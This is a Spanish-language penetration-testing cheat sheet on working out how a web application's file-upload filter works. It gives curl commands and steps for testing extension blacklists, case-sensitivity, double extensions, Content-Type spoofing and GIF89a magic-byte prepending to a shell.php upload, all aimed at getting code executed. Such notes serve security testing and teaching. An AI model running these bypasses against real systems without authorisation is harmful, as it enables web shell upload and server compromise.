---
aliases: null
tags:
  - type/technique
  - vuln/file-upload
  - technique/execution
  - asset/web-app
kind: SubCheatSheet
linked:
  - '[[File Upload - Vulnerabilidades]]'
---
# File Upload - Reconocimiento del Filtro

***

## Cheatsheet

| **Probe** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Subir `recon.hack` (ext inventada) | Si **sube** → blacklist (deja pasar lo desconocido). Si **rechaza** → whitelist. | Probe canónico para identificar política. |
| Subir `recon.php` y `recon.PHP` | Si rechaza ambos → case-insensitive. Si acepta `PHP` → case bypass viable. | Determina case sensitivity del filtro. |
| Subir `recon.php.jpg` y `recon.jpg.php` | Si acepta `recon.php.jpg` → valida última ext. Si acepta `recon.jpg.php` → valida primera. Si rechaza ambos → regex strict. | Identifica parser de extensión. |
| Subir `shell.php`, interceptar Burp, cambiar `Content-Type: image/jpeg` | Si sube → validación solo de header. | Test de validación superficial. |
| Subir `shell.php` con `GIF89a;` como primera línea + payload PHP | Si sube → valida magic bytes. | Test de validación profunda. |
| Subir `.jpg` válido con `<?php phpinfo(); ?>` en EXIF/comment | Si bloquea → WAF/AV scanea contenido. | Test de inspección de contenido. |
| Subir `recon.jpg`, ver response → buscar URL del archivo | Localiza path de upload | Pre-requisito para verificar ejecución. |
| `curl -X POST -F 'file=@test.png' https://target/upload -v` | Ver Content-Type respondido + Location/path | Recon manual sin frontend. |
^fu-reconocimiento

### Workflow ordenado

```bash
# IMPORTANTE: probar UN vector por vez para aislar cuál validación bloquea.

# 1. Tipo de filtro
curl -F 'file=@recon.hack' https://target/upload  # blacklist vs whitelist

# 2. Case sensitivity
curl -F 'file=@recon.PHP' https://target/upload

# 3. Parser de extensión
for fname in 'recon.php.jpg' 'recon.jpg.php' 'recon.php.aaaa.jpg'; do
  cp recon.php "$fname"
  echo "=== $fname ==="
  curl -F "file=@$fname" https://target/upload
done

# 4. Validación de content-type (Burp interception + edit header)

# 5. Magic bytes
cp shell.php shell_magic.php
sed -i '1i GIF89a;' shell_magic.php
curl -F 'file=@shell_magic.php' https://target/upload

# 6. Localizar el path del archivo
curl -F 'file=@unique_marker.png' https://target/upload -v | grep -iE 'location:|path|url'
# Buscar en response HTML: <img src="...">
```

___

## Overview

Recon **antes** de bypass = decide la estrategia. Si probás bypass + content al mismo tiempo y el server rechaza, no sabés cuál validación falló.

**Orden recomendado:**
1. Política (blacklist/whitelist) — `recon.hack`.
2. Case sensitivity — `recon.PHP`.
3. Parser de extensión (primera/última/todas) — variantes de doble ext.
4. Validación de `Content-Type` — interceptar y mutar.
5. Validación de magic bytes — agregar `GIF89a;` al payload.
6. WAF de contenido — inyectar `<?php` en metadata de imagen real.
7. Path de upload — necesario para ejecutar.

***
